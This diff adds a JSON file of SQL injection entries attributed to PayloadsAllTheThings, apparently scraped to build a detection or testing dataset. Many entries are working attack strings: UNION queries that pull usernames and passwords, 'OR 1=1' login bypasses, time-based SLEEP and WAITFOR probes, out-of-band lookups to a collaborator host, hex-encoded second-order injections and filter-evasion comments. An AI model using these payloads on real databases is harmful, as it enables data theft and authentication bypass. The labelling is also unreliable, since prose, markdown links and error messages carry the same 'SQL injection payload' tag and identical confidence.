@@ -1,0 +1,519 @@
+[
+  {
+    "payload": "* [UNION Based Injection](#union-based-injection)",
+    "category": "sqli",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.8,
+    "description": "SQL injection payload",
+    "tags": [
+      "sqli",
+      "database"
+    ]
+  },
+  {
+    "payload": "* **Timing Attacks**: Inputting SQL commands that cause deliberate delays (e.g., using `SLEEP` or `BENCHMARK` functions in MySQL) can help identify potential injection points. If the application takes an unusually long time to respond after such input, it might be vulnerable.",
+    "category": "sqli",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.8,
+    "description": "SQL injection payload",
+    "tags": [
+      "sqli",
+      "database"
+    ]
+  },
+  {
+    "payload": "| SQLITE              | `last_insert_rowid()>1` |",
+    "category": "sqli",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.8,
+    "description": "SQL injection payload",
+    "tags": [
+      "sqli",
+      "database"
+    ]
+  },
+  {
+    "payload": "| SQLITE              | `last_insert_rowid()=last_insert_rowid()` |",
+    "category": "sqli",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.8,
+    "description": "SQL injection payload",
+    "tags": [
+      "sqli",
+      "database"
+    ]
+  },
+  {
+    "payload": "SELECT * FROM users WHERE username = 'user' AND password = 'pass';",
+    "category": "sqli",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.8,
+    "description": "SQL injection payload",
+    "tags": [
+      "sqli",
+      "database"
+    ]
+  },
+  {
+    "payload": "SELECT * FROM users WHERE username = '' OR '1'='1'--' AND password = '';",
+    "category": "sqli",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.8,
+    "description": "SQL injection payload",
+    "tags": [
+      "sqli",
+      "database"
+    ]
+  },
+  {
+    "payload": ":warning: Avoid using this payload indiscriminately, as it always returns true. It could interact with endpoints that may inadvertently delete sessions, files, configurations, or database data.",
+    "category": "sqli",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.8,
+    "description": "SQL injection payload",
+    "tags": [
+      "sqli",
+      "database"
+    ]
+  },
+  {
+    "payload": "sql = \"SELECT * FROM admin WHERE pass = '\".md5($password,true).\"'\";",
+    "category": "sqli",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.8,
+    "description": "SQL injection payload",
+    "tags": [
+      "sqli",
+      "database"
+    ]
+  },
+  {
+    "payload": "sql1 = \"SELECT * FROM admin WHERE pass = '\".md5(\"ffifdyop\", true).\"'\";",
+    "category": "sqli",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.8,
+    "description": "SQL injection payload",
+    "tags": [
+      "sqli",
+      "database"
+    ]
+  },
+  {
+    "payload": "sql1 = \"SELECT * FROM admin WHERE pass = ''or'6\ufffd]\ufffd\ufffd!r,\ufffd\ufffdb\u001c'\";",
+    "category": "sqli",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.8,
+    "description": "SQL injection payload",
+    "tags": [
+      "sqli",
+      "database"
+    ]
+  },
+  {
+    "payload": "* Query the database for the user record (e.g., `SELECT username, password_hash FROM users WHERE username = ?`).",
+    "category": "sqli",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.8,
+    "description": "SQL injection payload",
+    "tags": [
+      "sqli",
+      "database"
+    ]
+  },
+  {
+    "payload": "admin' AND 1=0 UNION ALL SELECT 'admin', '161ebd7d45089b3446ee4e0d86dbcf92'--",
+    "category": "sqli",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.8,
+    "description": "SQL injection payload",
+    "tags": [
+      "sqli",
+      "database"
+    ]
+  },
+  {
+    "payload": "* `SELECT 'admin', '161ebd7d45089b3446ee4e0d86dbcf92'`: select as many columns as necessary, here 161ebd7d45089b3446ee4e0d86dbcf92 corresponds to `MD5(\"P@ssw0rd\")`.",
+    "category": "sqli",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.8,
+    "description": "SQL injection payload",
+    "tags": [
+      "sqli",
+      "database"
+    ]
+  },
+  {
+    "payload": "In a standard SQL query, data is retrieved from one table. The `UNION` operator allows multiple `SELECT` statements to be combined. If an application is vulnerable to SQL injection, an attacker can inject a crafted SQL query that appends a `UNION` statement to the original query.",
+    "category": "sqli",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.8,
+    "description": "SQL injection payload",
+    "tags": [
+      "sqli",
+      "database"
+    ]
+  },
+  {
+    "payload": "SELECT product_name, product_price FROM products WHERE product_id = 'input_id';",
+    "category": "sqli",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.8,
+    "description": "SQL injection payload",
+    "tags": [
+      "sqli",
+      "database"
+    ]
+  },
+  {
+    "payload": "1' UNION SELECT username, password FROM users --",
+    "category": "sqli",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.8,
+    "description": "SQL injection payload",
+    "tags": [
+      "sqli",
+      "database"
+    ]
+  },
+  {
+    "payload": "SELECT product_name, product_price FROM products WHERE product_id = '1' UNION SELECT username, password FROM users --';",
+    "category": "sqli",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.8,
+    "description": "SQL injection payload",
+    "tags": [
+      "sqli",
+      "database"
+    ]
+  },
+  {
+    "payload": ":warning: The 2 SELECT clauses must have the same number of columns.",
+    "category": "sqli",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.8,
+    "description": "SQL injection payload",
+    "tags": [
+      "sqli",
+      "database"
+    ]
+  },
+  {
+    "payload": "LIMIT CAST((SELECT version()) as numeric)",
+    "category": "sqli",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.8,
+    "description": "SQL injection payload",
+    "tags": [
+      "sqli",
+      "database"
+    ]
+  },
+  {
+    "payload": "* Default `SLEEP` function for the database",
+    "category": "sqli",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.8,
+    "description": "SQL injection payload",
+    "tags": [
+      "sqli",
+      "database"
+    ]
+  },
+  {
+    "payload": "' AND SLEEP(5)/*",
+    "category": "sqli",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.8,
+    "description": "SQL injection payload",
+    "tags": [
+      "sqli",
+      "database"
+    ]
+  },
+  {
+    "payload": "' AND '1'='1' AND SLEEP(5)",
+    "category": "sqli",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.8,
+    "description": "SQL injection payload",
+    "tags": [
+      "sqli",
+      "database"
+    ]
+  },
+  {
+    "payload": "' ; WAITFOR DELAY '00:00:05' --",
+    "category": "sqli",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.8,
+    "description": "SQL injection payload",
+    "tags": [
+      "sqli",
+      "database"
+    ]
+  },
+  {
+    "payload": "BENCHMARK(2000000,MD5(NOW()))",
+    "category": "sqli",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.8,
+    "description": "SQL injection payload",
+    "tags": [
+      "sqli",
+      "database"
+    ]
+  },
+  {
+    "payload": "http://example.com/item?id=1 AND IF(SUBSTRING(VERSION(), 1, 1) = '5', BENCHMARK(1000000, MD5(1)), 0) --",
+    "category": "sqli",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.8,
+    "description": "SQL injection payload",
+    "tags": [
+      "sqli",
+      "database"
+    ]
+  },
+  {
+    "payload": "SELECT ... INTO OUTFILE '\\\\\\\\BURP-COLLABORATOR-SUBDOMAIN\\a'",
+    "category": "sqli",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.8,
+    "description": "SQL injection payload",
+    "tags": [
+      "sqli",
+      "database"
+    ]
+  },
+  {
+    "payload": "SELECT UTL_INADDR.get_host_address('BURP-COLLABORATOR-SUBDOMAIN')",
+    "category": "sqli",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.8,
+    "description": "SQL injection payload",
+    "tags": [
+      "sqli",
+      "database"
+    ]
+  },
+  {
+    "payload": "SLEEP(1) /*' or SLEEP(1) or '\" or SLEEP(1) or \"*/",
+    "category": "sqli",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.8,
+    "description": "SQL injection payload",
+    "tags": [
+      "sqli",
+      "database"
+    ]
+  },
+  {
+    "payload": "In short, the result of the first SQL query is used to build the second SQL query. The usual format is `' union select 0xHEXVALUE --` where the HEX is the SQL injection for the second query.",
+    "category": "sqli",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.8,
+    "description": "SQL injection payload",
+    "tags": [
+      "sqli",
+      "database"
+    ]
+  },
+  {
+    "payload": "`0x2720756e696f6e2073656c65637420312c3223` is the hex encoded of `' union select 1,2#`",
+    "category": "sqli",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.8,
+    "description": "SQL injection payload",
+    "tags": [
+      "sqli",
+      "database"
+    ]
+  },
+  {
+    "payload": "' union select 0x2720756e696f6e2073656c65637420312c3223#",
+    "category": "sqli",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.8,
+    "description": "SQL injection payload",
+    "tags": [
+      "sqli",
+      "database"
+    ]
+  },
+  {
+    "payload": "`0x2d312720756e696f6e2073656c656374206c6f67696e2c70617373776f72642066726f6d2075736572732d2d2061` is the hex encoded of `-1' union select login,password from users-- a`.",
+    "category": "sqli",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.8,
+    "description": "SQL injection payload",
+    "tags": [
+      "sqli",
+      "database"
+    ]
+  },
+  {
+    "payload": "-1' union select 0x2d312720756e696f6e2073656c656374206c6f67696e2c70617373776f72642066726f6d2075736572732d2d2061 -- a",
+    "category": "sqli",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.8,
+    "description": "SQL injection payload",
+    "tags": [
+      "sqli",
+      "database"
+    ]
+  },
+  {
+    "payload": "INSERT INTO users (username, email) VALUES ('attacker\\'--', 'attacker@example.com');",
+    "category": "sqli",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.8,
+    "description": "SQL injection payload",
+    "tags": [
+      "sqli",
+      "database"
+    ]
+  },
+  {
+    "payload": "query = \"SELECT * FROM logs WHERE username = '\" + user_from_db + \"'\"",
+    "category": "sqli",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.8,
+    "description": "SQL injection payload",
+    "tags": [
+      "sqli",
+      "database"
+    ]
+  },
+  {
+    "payload": "* SQL injection anywhere inside a PDO statement: `$pdo->prepare(\"SELECT $INJECT_SQL_HERE...\")`.",
+    "category": "sqli",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.8,
+    "description": "SQL injection payload",
+    "tags": [
+      "sqli",
+      "database"
+    ]
+  },
+  {
+    "payload": "$stmt = $pdo->prepare(\"SELECT $col FROM animals WHERE name = ?\");",
+    "category": "sqli",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.8,
+    "description": "SQL injection payload",
+    "tags": [
+      "sqli",
+      "database"
+    ]
+  },
+  {
+    "payload": "$stmt = $pdo->prepare(\"SELECT $col FROM animals WHERE name = :name\");",
+    "category": "sqli",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.8,
+    "description": "SQL injection payload",
+    "tags": [
+      "sqli",
+      "database"
+    ]
+  },
+  {
+    "payload": "* Force a select \\`'x\\` instead of a column name and create a comment. Inject a backtick to fix the column and terminate the SQL query with `;#`: `GET /index.php?col=%3f%23%00&name=x%60;%23`",
+    "category": "sqli",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.8,
+    "description": "SQL injection payload",
+    "tags": [
+      "sqli",
+      "database"
+    ]
+  },
+  {
+    "payload": "Column not found: 1054 Unknown column ''x' in 'SELECT'",
+    "category": "sqli",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.8,
+    "description": "SQL injection payload",
+    "tags": [
+      "sqli",
+      "database"
+    ]
+  },
+  {
+    "payload": "* Inject in second parameter the payload. `GET /index2.php?col=\\%3f%23%00&name=x%60+FROM+(SELECT+table_name+AS+`'x`+from+information_schema.tables)y%3b%2523`",
+    "category": "sqli",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.8,
+    "description": "SQL injection payload",
+    "tags": [
+      "sqli",
+      "database"
+    ]
+  },
+  {
+    "payload": "SELECT `\\?#\\0` FROM animals WHERE name = ?",
+    "category": "sqli",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.8,
+    "description": "SQL injection payload",
+    "tags": [
+      "sqli",
+      "database"
+    ]
+  },
+  {
+    "payload": "SELECT `\\'x` FROM (SELECT table_name AS `\\'x` from information_schema.tables)y;#'#\\0` FROM animals WHERE name = ?",
+    "category": "sqli",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.8,
+    "description": "SQL injection payload",
+    "tags": [
+      "sqli",
+      "database"
+    ]
+  },
+  {
+    "payload": "| `?id=1/*!12345UNION*//*!12345SELECT*/1--` | Conditional comment  |",
+    "category": "sqli",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.8,
+    "description": "SQL injection payload",
+    "tags": [
+      "sqli",
+      "database"
+    ]
+  },
+  {
+    "payload": "| `SELECT 1,2,3,4`    | `UNION SELECT * FROM (SELECT 1)a JOIN (SELECT 2)b JOIN (SELECT 3)c JOIN (SELECT 4)d` |",
+    "category": "sqli",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.8,
+    "description": "SQL injection payload",
+    "tags": [
+      "sqli",
+      "database"
+    ]
+  },
+  {
+    "payload": "* [Root Me - SQL injection - Insert](https://www.root-me.org/en/Challenges/Web-Server/SQL-injection-Insert)",
+    "category": "sqli",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.8,
+    "description": "SQL injection payload",
+    "tags": [
+      "sqli",
+      "database"
+    ]
+  },
+  {
+    "payload": "* [SQLi in INSERT worse than SELECT - Mathias Karlsson - February 14, 2017](https://web.archive.org/web/20231004093323/https://labs.detectify.com/2017/02/14/sqli-in-insert-worse-than-select/)",
+    "category": "sqli",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.8,
+    "description": "SQL injection payload",
+    "tags": [
+      "sqli",
+      "database"
+    ]
+  }
+]
